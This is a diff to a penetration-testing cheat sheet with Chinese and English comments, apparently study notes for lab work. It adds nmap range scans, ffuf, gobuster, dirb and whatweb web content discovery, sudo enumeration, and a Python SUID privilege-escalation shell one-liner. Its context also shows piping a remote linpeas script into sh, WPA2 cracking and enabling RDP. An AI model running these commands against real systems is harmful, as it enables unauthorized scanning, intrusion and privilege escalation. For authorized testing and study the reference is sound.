@@ -12,7 +12,9 @@
 ```sh
 sudo nmap 10.10.10.16  //1000 port
 sudo nmap 10.10.10.16 -p-  //1-65535 port
-sudo nmap 10.10.10.16 -sU -p53,139,161,1900,5353  //UDP port
+sudo nmap 10.10.10.* -sU -p53,139,161,1900,5353  //UDP port
+sudo nmap 10.10.10.* -sV -p80,8080,25,389,3389   
+sudo nmap -A -p- 10.10.10.16 | grep xxxxx  //尋找某特定服務
 sudo nmap 10.10.10.16 -p80 --reason  //REASON
 sudo nmap 10.10.10.16 -p80 --open  //display only open port ip
 sudo nmap 10.10.10.16 -O  //OS
@@ -112,6 +114,37 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Terminal Server" /v fDenyTS
 netstat -an | findstr :3389
 ```
 
+## _web content discovery_
+
+[Ffuf爆破神器](https://blog.csdn.net/weixin_44288604/article/details/128444485)
+[FFUF Cheat Sheet](https://cheatsheet.haax.fr/web-pentest/tools/ffuf/)
+
+```sh
+#測試網站程式檔名
+ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://testphp.vulnweb.com/FUZZ -e .txt
+#測試網站程式種類語法
+ffuf -c -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -u http://testphp.vulnweb.com/indexFUZZ
+# 目錄查找
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -k -x "txt,html,php,asp,aspx,jpg,jsp,zip" -u http://127.0.0.1:61389
+# 找Virtual Host
+gobuster vhost -u http://domain.com/ -w /usr/share/wordlist/dirb/common.txt
+# dirb
+dirb http://192.168.0.1/
+dirb http://192.168.0.1/ -X .aspx
+# dirsearch
+dirsearch -u "http://192.168.0.1/" -e aspx
+dirsearch -u "http://192.168.0.1/" -e asp,aspx,txt
+```
+
+## _whatweb_
+
+```sh
+whatweb -u http://192.168.0.1/
+whatweb -v -a 3 <domain_name>
+whatweb --no-errors 192.168.0.0/24
+whatweb --no-errors --url-prefix https:// 192.168.0.0/24
+```
+
 ## _sqlmap_
 
 SQL檢測注入工具
@@ -174,6 +207,15 @@ aircrack-ng WPA2ooo.cap -w /usr/share/wordlists/nmap.lst
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 
+## _sudo_
+
+```sh
+# 列舉可執行命令
+sudo -l
+# 免 root 密碼切換至 root 方式
+sudo -i
+```
+
 ## _Android_
 
 ```sh
@@ -205,6 +247,7 @@ snow -C -p pass text2.txt text3.txt
 rpcinfo -p <Target IP Address>
 # to mount an NFS share on a Linux system
 apt install nfs-common
+service rpcbind start
 showmount -e 10.10.10.20
 mount -t nfs 10.10.10.20:/home /mnt/nfs
 # to mount an SMB share on a Linux system
@@ -281,6 +324,12 @@ set RHOSTS 10.10.10.10  (target ip)
 set RPORT 8080          (target port)
 set TARGETURI http://10.10.10.10:8080/
 set USERNAME admin
+```
+
+## _SUID Binaries for Privilege Escalation_
+
+```sh
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 
 ## _others_
